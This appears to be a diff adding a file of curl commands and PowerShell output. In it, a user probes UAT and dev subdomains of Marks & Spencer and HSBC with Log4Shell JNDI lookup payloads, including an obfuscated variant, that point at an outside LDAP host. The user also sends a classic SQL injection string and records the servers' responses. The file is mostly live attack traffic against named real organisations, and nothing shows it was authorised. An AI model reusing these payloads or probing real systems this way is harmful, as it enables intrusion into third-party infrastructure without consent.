@@ -1,0 +1,147 @@
+
+
+curl -k -X POST "https://uat.comshub-msb.markandspencer.com=$%7Bjndi:ldap://example.com%7D" -vv
+
+
+
+curl -G https://uat.comshub-msb.markandspencer.com --data-urlencode "param=' OR '1'='1" -vv -k 
+curl -G https://uat.comshub-msb.markandspencer.com --data-urlencode "param=' OR '1'='1" -vv -k 
+
+
+
+curl -H "Referer: $${jnd$${lower:i}:ldap://example.com/b}" https://uat.comshub-msb.markandspencer.com -vv
+curl -H "Referer: $${jnd$${lower:i}:ldap://example.com/b}" https://apply-glcm-dev.gbm.hsbc.com -vv -k
+
+PS C:\Users\Sanket> curl -G https://uat.comshub-msb.markandspencer.com --data-urlencode "param=' OR '1'='1" -vv -k
+*   Trying 103.224.182.246:443...
+* Connected to uat.comshub-msb.markandspencer.com (103.224.182.246) port 443
+* schannel: disabled automatic use of client certificate
+* ALPN: curl offers http/1.1
+* ALPN: server did not agree on a protocol. Uses default.
+* using HTTP/1.x
+> GET /?param=%27+OR+%271%27%3d%271 HTTP/1.1
+> Host: uat.comshub-msb.markandspencer.com
+> User-Agent: curl/8.4.0
+> Accept: */*
+>
+* schannel: server closed the connection
+< HTTP/1.1 302 Found
+< date: Thu, 02 May 2024 12:23:29 GMT
+< server: Apache
+< set-cookie: __tad=1714652609.4349399; expires=Sun, 30-Apr-2034 12:23:29 GMT; Max-Age=315360000
+< location: http://ww25.uat.comshub-msb.markandspencer.com/?param=%27+OR+%271%27%3d%271&subid1=20240502-2223-2996-bde5-dc6b30e5ab24
+< content-length: 2
+< content-type: text/html; charset=UTF-8
+< connection: close
+<
+
+
+* Closing connection
+* schannel: shutting down SSL/TLS connection with uat.comshub-msb.markandspencer.com port 443
+PS C:\Users\Sanket> curl -G https://uat.comshub-msb.markandspencer.com --data-urlencode "param=' OR '1'='1" -vv -k
+*   Trying 103.224.182.246:443...
+* Connected to uat.comshub-msb.markandspencer.com (103.224.182.246) port 443
+* schannel: disabled automatic use of client certificate
+* ALPN: curl offers http/1.1
+* ALPN: server did not agree on a protocol. Uses default.
+* using HTTP/1.x
+> GET /?param=%27+OR+%271%27%3d%271 HTTP/1.1
+> Host: uat.comshub-msb.markandspencer.com
+> User-Agent: curl/8.4.0
+> Accept: */*
+>
+* schannel: server closed the connection
+< HTTP/1.1 302 Found
+< date: Thu, 02 May 2024 12:23:36 GMT
+< server: Apache
+< set-cookie: __tad=1714652616.3632718; expires=Sun, 30-Apr-2034 12:23:36 GMT; Max-Age=315360000
+< location: http://ww25.uat.comshub-msb.markandspencer.com/?param=%27+OR+%271%27%3d%271&subid1=20240502-2223-363a-a592-da4985b95332
+< content-length: 2
+< content-type: text/html; charset=UTF-8
+< connection: close
+<
+
+
+* Closing connection
+* schannel: shutting down SSL/TLS connection with uat.comshub-msb.markandspencer.com port 443
+PS C:\Users\Sanket> curl -H "Referer: $${jnd$${lower:i}:ldap://example.com/b}" https://uat.comshub-msb.markandspencer.com -vv
+*   Trying 103.224.182.246:443...
+* Connected to uat.comshub-msb.markandspencer.com (103.224.182.246) port 443
+* schannel: disabled automatic use of client certificate
+* ALPN: curl offers http/1.1
+* schannel: SNI or certificate check failed: SEC_E_WRONG_PRINCIPAL (0x80090322) - The target principal name is incorrect.
+* Closing connection
+* schannel: shutting down SSL/TLS connection with uat.comshub-msb.markandspencer.com port 443
+curl: (60) schannel: SNI or certificate check failed: SEC_E_WRONG_PRINCIPAL (0x80090322) - The target principal name is incorrect.
+More details here: https://curl.se/docs/sslcerts.html
+
+curl failed to verify the legitimacy of the server and therefore could not
+establish a secure connection to it. To learn more about this situation and
+how to fix it, please visit the web page mentioned above.
+PS C:\Users\Sanket> curl -H "Referer: $${jnd$${lower:i}:ldap://example.com/b}" https://apply-glcm-dev.gbm.hsbc.com -vv -k
+*   Trying 91.214.7.222:443...
+* Connected to apply-glcm-dev.gbm.hsbc.com (91.214.7.222) port 443
+* schannel: disabled automatic use of client certificate
+* ALPN: curl offers http/1.1
+* ALPN: server did not agree on a protocol. Uses default.
+* using HTTP/1.x
+> GET / HTTP/1.1
+> Host: apply-glcm-dev.gbm.hsbc.com
+> User-Agent: curl/8.4.0
+> Accept: */*
+> Referer: -vv{jnd-vv{lower:i}:ldap://example.com/b}
+>
+< HTTP/1.1 502 Proxy Error
+< Date: Thu, 02 May 2024 12:23:52 GMT
+< X-Frame-Options: SAMEORIGIN
+< Strict-Transport-Security: max-age=16070400; includeSubDomains
+< Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept, Accept-Encoding, Accept-Language, Host, Referer, User-Agent, Authorization, X-CSRF-Token, X-TS-Client-Version, X-TS-Dfp-Instructions
+< Access-Control-Expose-Headers: X-TS-Dfp-Instructions
+< Content-Length: 379
+< Content-Type: text/html; charset=iso-8859-1
+<
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>502 Proxy Error</title>
+</head><body>
+<h1>Proxy Error</h1>
+<p>The proxy server received an invalid
+response from an upstream server.<br />
+The proxy server could not handle the request <em><a href="/">GET&nbsp;/</a></em>.<p>
+Reason: <strong>Error reading from remote server</strong></p></p>
+</body></html>
+* Connection #0 to host apply-glcm-dev.gbm.hsbc.com left intact
+PS C:\Users\Sanket>
+
+
+
+PS C:\Users\Sanket> curl -k -X POST "https://uat.comshub-msb.markandspencer.com/?parameter=$%7Bjndi:ldap://example.com%7D" -vv
+*   Trying 103.224.182.246:443...
+* Connected to uat.comshub-msb.markandspencer.com (103.224.182.246) port 443
+* schannel: disabled automatic use of client certificate
+* ALPN: curl offers http/1.1
+* ALPN: server did not agree on a protocol. Uses default.
+* using HTTP/1.x
+> POST /?parameter=$%7Bjndi:ldap://example.com%7D HTTP/1.1
+> Host: uat.comshub-msb.markandspencer.com
+> User-Agent: curl/8.4.0
+> Accept: */*
+>
+* schannel: server closed the connection
+< HTTP/1.1 302 Found
+< date: Thu, 02 May 2024 12:31:37 GMT
+< server: Apache
+< set-cookie: __tad=1714653097.3026903; expires=Sun, 30-Apr-2034 12:31:37 GMT; Max-Age=315360000
+< location: http://ww25.uat.comshub-msb.markandspencer.com/?parameter=$%7Bjndi:ldap://example.com%7D&subid1=20240502-2231-3745-8487-fcead4c6e6fd
+< content-length: 2
+< content-type: text/html; charset=UTF-8
+< connection: close
+<
+
+
+* Closing connection
+* schannel: shutting down SSL/TLS connection with uat.comshub-msb.markandspencer.com port 443
+PS C:\Users\Sanket>
+
+
+	
